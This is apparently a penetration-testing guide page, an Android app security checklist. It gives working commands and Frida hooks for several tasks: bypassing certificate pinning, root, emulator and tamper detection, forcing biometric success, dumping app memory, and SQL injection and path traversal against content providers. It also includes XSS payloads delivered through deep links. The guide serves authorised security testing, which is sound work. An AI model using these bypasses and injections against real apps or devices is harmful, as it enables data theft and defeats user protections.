---
title: "Testing checklist"
description: "The Android penetration testing checklist: pinning and detection bypasses, storage, IPC, deep links, WebView, memory, signer and integrity checks."
tags:
  - Android
  - Checklist
  - SSL Pinning
  - Frida
  - IPC
---

# Android testing checklist

!!! note "What this page is doing"
    Use each checkbox as a test record: note the device/app version, identity, method, result and evidence reference. “Not vulnerable,” “blocked by a control” and “not applicable” are useful outcomes when they are explained.

The working list, in the order that makes sense on an engagement: get traffic flowing first, then storage, then the IPC surface, then everything the code tells you to look for.

## Quick list

- [ ] SSL pinning bypassed or confirmed absent
- [ ] Root detection bypassed (or noted as a control that held)
- [ ] Emulator detection bypassed
- [ ] Logcat checked for credentials, tokens and PII
- [ ] Local storage audited: preferences, databases, cache, external storage
- [ ] App memory dumped and searched for secrets
- [ ] Signer certificate reviewed (algorithm, v1/v2/v3, debug key)
- [ ] Exported activities tested for auth bypass and crash states
- [ ] WebView tested: JavaScript bridge, `file://` access, deep-link abuse
- [ ] Intent redirection, spoofing and sniffing tested
- [ ] Broadcast receivers triggered with crafted actions and extras
- [ ] Content providers queried, injected and walked for path traversal
- [ ] Obfuscation quality assessed
- [ ] Hardcoded secrets searched for in code, resources and native libraries
- [ ] Insecure coding patterns reviewed (weak random, ECB, cleartext, world-readable files)
- [ ] Deep links tested for auth bypass, sensitive actions and injection
- [ ] Integrity checks tested by repackaging
- [ ] Manifest permissions reviewed against what the app actually does
- [ ] Background screen caching and `FLAG_SECURE` tested
- [ ] Firebase endpoints tested for open read and write
- [ ] Biometric and device-credential checks tested for bypass
- [ ] FileProvider paths reviewed for over-exposure
- [ ] Tamper detection bypassed and re-signed APK installed

## 1. SSL pinning bypass

Identify the framework before choosing a method — the right bypass depends on whether pinning lives in Java, in a native library, or in a framework-specific runtime.

```bash
# Identify: unpack the APK and look inside assets/
unzip -l app.apk | grep -iE "flutter|mono|xamarin|cordova|index.android.bundle"

#   flutter_assets/ or libflutter.so  -> Flutter  (method 1 or 4)
#   assemblies/ or mono/              -> Xamarin  (method 1)
#   www/                              -> Cordova  (method 2 or 5)
#   index.android.bundle              -> React Native
#   none of the above                 -> native Android, method 6, 7 or 8

# Burp: Proxy -> Options -> Edit -> Request Handling -> enable Invisible Proxy.
# Invisible proxy mode keeps working when the app connects to a literal IP
# or a hostname that does not resolve
```

### Method 1 — iptables redirection (Flutter and Xamarin)

Flutter and Xamarin bypass the Android proxy settings entirely: they implement their own networking and ignore the system proxy, so nothing you configure in Settings will be seen. Redirect the packets at the kernel instead.

```bash
# You need root for iptables
adb root

# Flush any existing NAT rules so you start clean
adb shell "iptables -t nat -F"

# Send all outbound HTTP to Burp: -t nat selects the NAT table,
# -A OUTPUT appends a rule for locally generated traffic,
# -j DNAT rewrites the destination address
adb shell iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to <burp_ip>:8080
adb shell iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to <burp_ip>:8080

# MASQUERADE makes the response traffic route back correctly. Without it the
# app receives replies from an address it never talked to
adb shell "iptables -t nat -A POSTROUTING -p tcp --dport 443 -j MASQUERADE"
adb shell "iptables -t nat -A POSTROUTING -p tcp --dport 80 -j MASQUERADE"

# Verify the rules are in place
su -c "iptables -t nat -L"

# Cleanup afterwards: delete the first POSTROUTING rule (repeat as needed)
adb shell su -c "iptables -t nat -D POSTROUTING 1"
```

Note that this only works if the app does not also pin. Redirected traffic still fails TLS validation if the app checks the server key.

### Method 2 — replace the hardcoded hash (Cordova)

Cordova apps often pin by comparing a SHA256 of the server's public key against a constant in the JavaScript or the Java layer. Change the constant to Burp's and the check passes.

```bash
# Decode the APK and find the hardcoded hash
apktool d test.apk
grep -RnE "[A-Za-z0-9+/]{43}=" test/ | head

# Compute the same hash for Burp's CA:
#   x509 -pubkey -noout        extract the public key
#   pkey -pubin -outform der   re-encode it as DER, the format the hash covers
#   dgst -sha256 -binary       hash the DER bytes
#   enc -base64                encode the digest the way the app stores it
openssl x509 -in cacert.crt -pubkey -noout \
  | openssl pkey -pubin -outform der \
  | openssl dgst -sha256 -binary \
  | openssl enc -base64

# Replace the hash in the decoded app, rebuild, sign and install
apktool b test -o test.apk
java -jar uber-apk-signer-1.2.1.jar --apk test.apk
adb install -r test.apk
```

### Method 3 — manifest modification

If pinning is configured through `networkSecurityConfig`, the simplest bypass is to remove the reference and rebuild. The app then falls back to the platform default and your system-store CA is trusted.

```xml
<!-- Remove this attribute from <application> in AndroidManifest.xml -->
android:networkSecurityConfig="@xml/network_security_config"
```

```bash
# Rebuild the decoded lab app into a new APK.
apktool b test -o rebuilt.apk

# Align and sign the rebuilt artifact with a lab-only key.
java -jar uber-apk-signer-1.2.1.jar --apk rebuilt.apk

# Reinstall over the lab package; do not use this against a production device.
adb install -r rebuilt.apk
```

This also removes any other network rules in that file — cleartext allowances and pin sets alike — so check what else you are changing before you conclude the app is unpinned.

### Method 4 — reFlutter (Flutter apps)

Flutter compiles Dart to native code, so there is nothing to patch in smali. reFlutter rebuilds the engine with instrumentation that disables pinning and lets Burp see the traffic.

```bash
# Pin the version: reFlutter patches a specific engine build
pip3 install reflutter==0.8.6

# Run it against the APK, choose option 1 (pinning bypass), then enter the
# IP of the machine running Burp when prompted
reflutter test.apk

# The patched APK is written as release.RE.apk — sign it
java -jar uber-apk-signer-1.2.1.jar --apk release.RE.apk

# In Burp, enable invisible proxy on all interfaces
```

### Method 5 — replace the hardcoded certificate

Some apps ship the server certificate or CA inside the APK and compare against it. Swap the file for Burp's and the comparison succeeds.

```bash
# Decode and find the bundled certificate
apktool d test.apk
find . | grep .cer

# Replace it with Burp's certificate (keep the same file name and format)
cp ~/burp_cert.cer ./path/to/hardcoded.cer

# Rebuild, sign, install
apktool b test -o test.apk
java -jar uber-apk-signer-1.2.1.jar --apk test.apk
adb install -r test.apk
```

### Method 6 — Objection

Objection bundles the common Frida hooks behind short commands. It handles pinning and root detection in one session.

```bash
# Push a frida-server matching the device's architecture and version
adb push frida-server /data/local/tmp

# Make it executable and start it in the background
chmod 777 /data/local/tmp/frida-server
./frida-server &

# Client side
pip3 install objection
objection -g <package_name> explore

# Inside the Objection prompt:
android sslpinning disable    # neutralise the common pinning implementations
android root disable          # neutralise the common root checks
```

### Method 7 — Frida script

```bash
# -U  target the USB device
# -f  spawn the app by package name (better than attaching: hooks land before
#     the pinning code runs)
# -l  load the script
# --no-pause  do not suspend the app at startup waiting for input
frida -U -f <package_name> -l ssl.js --no-pause
```

### Method 8 — reverse engineering the smali

When nothing else fits, patch the check itself. First find it:

```text
# Search the jadx output (or smali) for these strings:
#   pinning  TrustManager  X509TrustManager  CertificatePinner
#   OkHttpClient.Builder  HostnameVerifier  SSLSocketFactory
```

```bash
# -r  do not decode resources (faster, and you do not need them here)
# -f  overwrite the output directory if it exists
apktool d app.apk -r -f

# Example: pretend the check is CertificatePinner.check(...)
#   .method public final varargs check(...)V
#       return-void          <- add this as the first instruction so the
#                               method returns immediately and never throws
#   .end method

# Rebuild, using aapt2 (the modern resource compiler)
apktool b <folder> --use-aapt2 -o mod.apk

# Generate a signing key. -validity is in days; 10000 is the common
# "longer than I will care" value
keytool -genkey -v -keystore my-key.jks -alias my-alias -keyalg RSA -keysize 2048 -validity 10000

# zipalign must run before signing, and its output feeds apksigner.
# -v is verbose, 4 is the 4-byte alignment Android requires
zipalign -v 4 mod.apk aligned.apk

# Sign the aligned APK
apksigner sign --ks my-key.jks --ks-key-alias my-alias -out signed.apk aligned.apk

# Install the result
adb install -r signed.apk
```

```text
# Log strings that tell you pinning is the problem:
#   "Trust anchor for certification path not found"
#   SSLPeerUnverifiedException
#   "Certificate pinning failure"
```

## 2. Root detection bypass

```text
# Paths apps check for root:
#   /data/local/  /sbin/  /su/bin/  /system/bin/  /system/xbin/
#   /system/app/Superuser.apk  /cache  /data  /dev
#
# Modern setups (Magisk, KernelSU) hide most of these. The app then falls
# back to: package names of root managers, mount state, SELinux context,
# and the presence of known root paths in the process environment
```

```bash
# Objection one-liner once you are in an explore session
android root disable
```

```bash
# Or find the detection class in smali and hook it. Grep the smali for the
# strings the app matches on
grep -n "xbin\|root\|su\|jailbreak\|emulator\|detect" app/smali/Consts.smali

# Then use a Frida hook or patch the smali method to return false
# (see the Frida page for the full hook)
```

A root check that holds is also a result: it means the control works, and it is worth reporting as a defensive note rather than an obstacle.

## 3. Emulator detection bypass

```bash
# Detection strings often live in native libraries, since that side is
# harder to read and to patch
strings "lib/arm64-v8a/libURLConst.so" | grep -iE "goldfish|generic|sdk|genymotion|memu|bluestacks|nox"
```

```javascript
// Bypass: hook the detection method and force the "not an emulator" answer.
// Find the method with frida-trace or jadx first, then replace its body
Java.perform(function () {
    var Check = Java.use("com.example.app.util.RootCheck");
    Check.isEmulator.implementation = function () {
        return false;   // report a real device
    };
});
```

## 4. Sensitive data in logs

Logcat is world-readable on older Android versions and readable by any app holding `READ_LOGS`. Developers log more than they think.

```bash
# Follow the log and filter. On Linux or macOS use grep instead of
# PowerShell's Select-String
adb logcat | grep -i "<keyword>"
adb logcat | grep -i "password"

# Also watch the whole stream around a login or a payment flow, where
# tokens and request bodies are most likely to get printed
adb logcat
```

```bash
# The keyboard cache is a separate source of the same problem: what the user
# typed is stored to help the keyboard predict, and it is readable with root
adb shell
su
cd /data/data/com.google.android.inputmethod.latin/files/personal/userhistory
```

## 5. Sensitive data in local storage

```bash
# Preferences. Comment in your report on whether they are encrypted —
# most are not, and the XML is directly readable
adb pull /data/data/<package>/shared_prefs

# Private and external caches
adb shell ls -R /data/data/<package>/cache/
adb shell ls -R /sdcard/Android/data/<package>/cache/

# Read a specific cache file
adb shell cat /data/data/<package>/cache/<file>

# Flutter apps keep a single preferences XML; check it explicitly because
# Flutter's own secure storage is easy to get wrong
adb shell "su -c 'cat /data/data/com.rozana.customer/shared_prefs/FlutterSharedPreferences.xml'"
```

## 6. Sensitive data in app memory

Keys that never touch disk are still in the heap while the app runs, and a memory dump finds them.

```bash
# fridump attaches with Frida, dumps the process memory, and runs strings
# over the result. -U = USB, -s = skip the "readable only" heuristic and
# dump the full readable ranges
fridump -U -s <package_name>

# In practice you run it against the package name and then search the dump:
fridump -U -s com.example.app
grep -a -iE "flag\{|api_key|token|password" dump/*   # adjust to the dump layout
```

## 7. Weak signer certificate

The signing certificate tells you how the app was built and what it was signed with.

```bash
# Print the signing certificates and their algorithms
apksigner verify --print-certs app.apk

# What to look for:
#   - MD5 or SHA1 signatures        weak, and refused by newer platform versions
#   - v1 signing only on Android <7 expected; on newer apps it is a smell
#   - CN=Android Debug              debug key on a store build
#   - CN=debug                      worse: a debug key deployed to production
```

A production app signed with a debug key is a finding on its own. The key is published in the SDK and lets anyone publish an update the device will accept as yours.

## 8. Exported activities

```bash
# List the activities declared by the installed package
adb shell dumpsys package <package_name> | grep -i "Activity"

# Launch one directly. If it is exported and unguarded, it starts without
# any login having happened
adb shell "am start -n com.example.app/com.example.app.SecretActivity"

# What to check: did the screen open? Is the user logged in? Does the app
# crash (a DoS finding, and a hint that the activity assumed internal state)?
```

## 9. WebView vulnerabilities

WebViews mix web content with native APIs. When the app loads a URL it does not control, or exposes a JavaScript bridge, the impact goes from XSS to native code execution.

```bash
# Launch the WebView through the app's deep link with a file:// URL.
# If the WebView renders local files, path traversal and file disclosure follow
adb shell am start -W -a android.intent.action.VIEW \
  -d "insecureshop://com.insecureshop/web?url=file:///sdcard/Download/test.txt"

# Test script execution the same way
adb shell am start -W -a android.intent.action.VIEW \
  -d "insecureshop://com.insecureshop/web?url=javascript:alert('XSS')"

# Blind XSS: push an HTML file and load it
adb push payload.html /sdcard/Download/
```

```text
# Flags to look for in the decompiled code:
#   webView.getSettings().setJavaScriptEnabled(true)
#       -> script execution is possible, so injected HTML becomes XSS
#   settings.setAllowUniversalAccessFromFileURLs(true)
#       -> a file:// page can read other local files; classic file theft
#   addJavascriptInterface(...)
#       -> Java objects exposed to JavaScript. If the WebView can be made to
#          load attacker content, this is remote code execution on older
#          Android versions (the classic addJavascriptInterface RCE)
#   shouldOverrideUrlLoading()
#       -> if it returns false for arbitrary URLs, the WebView navigates
#          wherever the attacker asks
```

```bash
# Check the WebView implementation version. An outdated WebView is a
# one-line finding, and it is separate from the app's own version
adb shell dumpsys webviewupdate
```

## 10. Intent vulnerabilities

| Type | Description |
| :--- | :--- |
| Intent redirection | An app receives an intent and forwards it without validating the target, so the attacker chooses which internal component runs |
| Intent spoofing | A malicious app sends a crafted intent to an exported activity, service or receiver, which acts on it as if the system had sent it |
| Intent sniffing | A malicious app listens for broadcasts that were not protected, and reads the data in them |

```text
# The rule to check against:
#   any <activity>, <receiver> or <provider> with android:exported="true"
#   and no android:permission set is reachable by anything on the device
#
# Then check the extras: does the component trust values it received
# (a URL, a file path, a package name) without validating them?
```

## 11. Broadcast receiver injection

```bash
# Find the exported receivers
adb shell pm dump <package> | grep -i "exported"

# Fire the action with no extras first
adb shell am broadcast -a com.target.PAYMENT

# Then with extras. -e sends a string extra as key/value
adb shell am broadcast -a com.target.ORDER -e orderId "5001" -e status "cancel"

# Watch the app's reaction — a state change or a log line tells you the
# receiver acted on attacker-supplied data
adb logcat | grep -i "Broadcast"
```

An exported receiver that accepts an implicit broadcast is reachable by any app on the device: no permission, no user interaction. If it triggers a payment, a data wipe or a config change, that is a high-severity finding.

## 12. Content provider vulnerabilities

Content providers are the most commonly misconfigured component, and the `content` command gives you the full query interface from ADB.

```bash
# Unauthorised read — the classic. No permission check means any app reads
# the whole table
adb shell content query --uri content://com.example.provider/users

# Unauthorised delete
adb shell content delete --uri content://com.example.provider/users/1

# Path traversal: walk out of the provider's intended directory into the
# app's private databases
adb shell content query --uri content://com.example.provider/../..//data/data/com.example/databases/

# SQL injection: --where appends to the provider's WHERE clause. "1=1"
# returns every row; a UNION or a subquery goes further
adb shell content query --uri content://com.example.provider/users --where "1=1"

# Unauthorised insert. --bind takes type:value, s = string
adb shell content insert --uri content://com.example.provider/users --bind pin:s:9999

# Confirm injection by watching for SQL errors that echo your input
adb logcat | grep -i "<injected_value>"
```

## 13. Obfuscation check

```text
# Good (obfuscated):
#   public class a { public String a(String b) { ... } }
#
# Bad (readable, so every check is easy to read):
#   public class TokenManager { public String generateToken(...) { ... } }
```

Readable names are not a vulnerability by themselves, but they turn every other finding into a five-minute job. Report it as a hardening item, and be specific about what was easy: "the certificate pinning check is named `isPinned` and reads from a constant" is a stronger note than "the app is not obfuscated".

## 14. Hardcoded sensitive information

```bash
# The greps that pay, run against the decompiled directory
grep -Rni -e "api_key" -e "apikey" -e "token" -e "password" -e "secret" .
grep -Rni -e "10\." -e "192\.168\." -e "internal" .          # internal IPs
grep -Rni -e "BEGIN PRIVATE KEY" -e "BEGIN RSA" .            # private keys
```

Include `assets/`, `res/raw/`, `lib/` and `google-services.json` in the sweep — they are the files people forget.

## 15. Insecure coding practices

```text
# Static: weak randomness used for security values.
# Look for java.util.Random, Math.random(), or a hardcoded seed:
#   new Random(12345)
# If an OTP, a reset token or a session ID comes from these, it is predictable
```

```text
# Functions and patterns to flag:
#
#   DES, AES/ECB mode              weak or wrongly used encryption
#   http://                        cleartext network calls
#   openFileOutput(MODE_WORLD_READABLE)   file readable by every app on the device
#   setJavaScriptEnabled(true)     enables script execution in WebViews
#   addJavascriptInterface         native bridge exposed to JavaScript, RCE risk
#   MD5, SHA1                      broken hashes, and wrong for passwords
#   Base64.encode                  encoding is not encryption
#   XOR                            home-made crypto
#   "AES/ECB/PKCS5Padding"         ECB leaks structure; identical plaintext
#                                  blocks produce identical ciphertext
#
# Dynamic: hook the crypto APIs with Frida and log what goes in and out —
# key, IV, plaintext, ciphertext. That turns "they use ECB" into a
# demonstrated weakness
```

## 16. Insecure deep links

```bash
# Authentication bypass: does this screen open without a session?
adb shell am start -a android.intent.action.VIEW -d "myapp://dashboard"

# Sensitive action triggered from a link
adb shell am start -a android.intent.action.VIEW -d "mybank://transfer?amount=1000&to=555123"

# Internal activity reachable through the scheme
adb shell am start -a android.intent.action.VIEW -d "myapp://settings/hidden"

# Injection through link parameters
adb shell am start -a android.intent.action.VIEW -d "myapp://search?query=<script>alert(1)</script>"

# Account takeover: a token the app trusts from the URL
adb shell am start -a android.intent.action.VIEW -d "myapp://login/reset?token=malicious"
```

```text
# Also search the code for PendingIntents built without a fixed package or
# component — those can be delivered to an attacker's app:
#   PendingIntent.getActivity
#   PendingIntent.getService
#   PendingIntent.getBroadcast
```

## 17. Missing integrity checks

```bash
# Decode the APK, change something harmless (a string, a layout), rebuild
apktool d app.apk
# edit res/values/strings.xml or a .smali file
apktool b <folder> --use-aapt2 -o mod.apk

# Install the modified build over the original
adb install -r mod.apk

# If it installs and runs, the app does no integrity checking of its own.
# Watch the logs while it starts, in case the check is there but silent
adb logcat | grep -i "<package_name>"
```

Installation passing only proves the platform accepted your signature. The finding you are looking for is the app running normally with modified code — no checksum comparison, no server-side attestation, no Play Integrity verdict enforced.

## 18. Insecure permissions

| Attribute | Risk |
| :--- | :--- |
| `android:usesCleartextTraffic="true"` | HTTP is allowed, so interception and tampering are trivial |
| `android:debuggable="true"` | A debugger can attach; ADB, Frida and JDWP all become easier |
| `android:allowBackup="true"` | `adb backup` extracts app data without root |
| `android:dataExtractionRules` misconfigured | Device-to-device transfers and cloud backups can carry sensitive data off the device |

```bash
# Read the effective flags from the installed package rather than only the source
adb shell dumpsys package <package_name> | grep -iE "flags|debuggable|allowBackup"
```

## 19. Background screen caching

When the app goes to the background, Android may keep a snapshot for the recents screen. If that snapshot is of a screen showing an OTP or a balance, it is readable by anyone who picks up the phone.

```text
# Manual test:
#   1. Enter sensitive data (OTP, login, profile with PII, card details)
#   2. Press the recent-apps button
#   3. Check whether the data is visible in the thumbnail
#
# Screenshot test:
#   Try to screenshot the sensitive screen. If screenshots are blocked at the
#   OS level, FLAG_SECURE is set and the snapshot is protected
#
# Static check:
#   Search the decompiled code for WindowManager.LayoutParams.FLAG_SECURE.
#   Absent on a screen that shows credentials = finding
```

## 20. Insecure Firebase database

```bash
# Find the database URL in the decoded lab app.
grep -RIn "firebaseio.com" .

# Make read-only requests and save headers/body separately for evidence.
# Stop at the first approved canary record; do not write to the database.
curl --silent --show-error --dump-header firebase-headers.txt \
  "https://<APP_NAME>.firebaseio.com/.json" \
  --output firebase-response.json
curl --silent --show-error --head \
  "https://<APP_NAME>.appspot.com/.json"
```

Read-only is still a breach of confidentiality — stop at the first record that proves it and document the request. If writes are open, note that too, but do not write to someone else's data.

## 21. Biometric authentication bypass

Biometric checks in the app are client-side. If the callback that runs on success can be called directly, or if the device-credential prompt result can be forged, the gate opens.

```text
# Search the decompiled code for:
#   BiometricPrompt            androidx biometric API
#   FingerprintManager         older platform API
#   KeyguardManager            device credential prompt
#   onAuthenticationSucceeded()
#   onAuthenticationFailed()
```

```javascript
// Hook 1 — force the biometric success callback.
// The callback object is what the app trusts, so calling it directly
// is equivalent to a successful fingerprint
Java.perform(function () {
    var Callback = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
    Callback.onAuthenticationSucceeded.implementation = function (r) {
        console.log("Forced biometric success");
        this.onAuthenticationSucceeded(r);   // call through so the app proceeds
    };
});
```

```javascript
// Hook 2 — force the result of the device credential prompt.
// RESULT_OK is -1, and any request code is accepted, so the app believes
// the user authenticated
Java.perform(function () {
    var Activity = Java.use("android.app.Activity");
    Activity.onActivityResult.implementation = function (req, res, data) {
        this.onActivityResult(req, -1, data);   // -1 == RESULT_OK
    };
});
```

```bash
# Inject either hook at spawn time
frida -U -f com.example.app -l hook.js --no-pause
```

## 22. Insecure FileProvider exposure

A `FileProvider` shares files with other apps through a `content://` URI. The path configuration decides how much it shares.

```xml
<!-- Overly permissive paths in res/xml/file_paths.xml: -->

<path="." />     <!-- Grants access to the root of external storage. Vulnerable -->
<path="../" />   <!-- Allows traversal out of the intended directory. Vulnerable -->
```

Impact: access to internal app files — user data, configuration, credentials — from any app that can get the provider URI. Check every `<external-path>`, `<files-path>`, `<cache-path>` entry for `.` and `..` and for directories that hold more than the provider was meant to share.

## 23. APK signing and tamper detection bypass

Some apps check their own signature at runtime and refuse to start if it changed.

```text
# The pattern in code:
#   getPackageInfo() -> getSigningCertificate() -> compare hash -> exit if mismatch
#
# To bypass: hook the check with Frida, or patch the comparison in smali
# so it always takes the "valid" branch
```

```bash
# Re-sign a patched APK so the platform will install it:
# 1. Generate a key
keytool -genkey -v -keystore my-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias

# 2. Align the patched APK, then sign the aligned file
zipalign -v 4 patched.apk aligned.apk
apksigner sign --ks my-key.jks --ks-key-alias my-alias -out signed.apk aligned.apk
```

Note the difference between the two problems: re-signing is what lets you install a modified build, and hooking the runtime check is what stops the app from detecting that you did. Both are usually needed on an app that takes tamper detection seriously.

## Next

- [Frida](frida.md) — the hooking toolkit these bypasses are built on.
- [Tools and references](tools.md) — the tool table and the helper commands.
